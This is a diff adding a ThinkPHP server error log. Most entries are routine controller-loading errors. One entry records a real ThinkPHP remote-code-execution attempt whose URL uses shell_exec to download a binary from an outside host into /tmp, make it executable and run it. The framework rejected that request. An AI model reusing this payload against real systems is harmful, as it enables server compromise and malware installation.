@@ -1,0 +1,15 @@
+[ 2019-02-25T16:04:50+08:00 ] 119.84.39.2 /zt/487.htm
+ERR: 无法加载控制器:Zt
+
+[ 2019-02-25T16:04:55+08:00 ] 119.84.39.2 /zt/487.htm
+ERR: 无法加载控制器:Zt
+
+[ 2019-02-25T16:22:21+08:00 ] 119.84.39.2 /zt/487.htm
+ERR: 无法加载控制器:Zt
+
+[ 2019-02-25T16:28:02+08:00 ] 119.84.39.2 /zt/487.htm
+ERR: 无法加载控制器:Zt
+
+[ 2019-02-25T18:53:38+08:00 ] 157.230.178.155 /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http%3A%2F%2F157.230.90.135%2Fbins%2Fapep.x86%20-O%20%2Ftmp%2F.gayboi%3B%20chmod%20777%20%2Ftmp%2F.gayboi%3B%20%2Ftmp%2F.gayboi%20thinkphp.x86
+ERR: 非法操作:\think\app
+
